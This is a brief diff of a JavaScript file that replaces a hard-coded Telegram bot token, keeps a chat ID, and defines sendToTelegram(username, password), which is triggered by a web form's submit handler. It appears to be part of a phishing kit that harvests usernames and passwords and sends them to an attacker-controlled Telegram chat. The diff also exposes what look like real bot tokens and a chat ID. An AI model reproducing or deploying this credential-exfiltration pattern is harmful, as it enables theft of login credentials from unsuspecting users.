@@ -1,5 +1,5 @@
 // Replace these with your bot token and chat ID
-const TELEGRAM_BOT_TOKEN = '7802847998:AAFuiOmYTIzrCz59EE8hdJq-o8woqZZD4C8';
+const TELEGRAM_BOT_TOKEN = '8343476631:AAHPu1CZ5rRvu2N1O49mjaiftL0tDJ6ZChU';
 const TELEGRAM_CHAT_ID = '6954486703';
 
 function sendToTelegram(username, password) {
@@ -30,3 +30,4 @@ document.addEventListener('DOMContentLoaded', () => {
         form.reset();
     });
 });
+
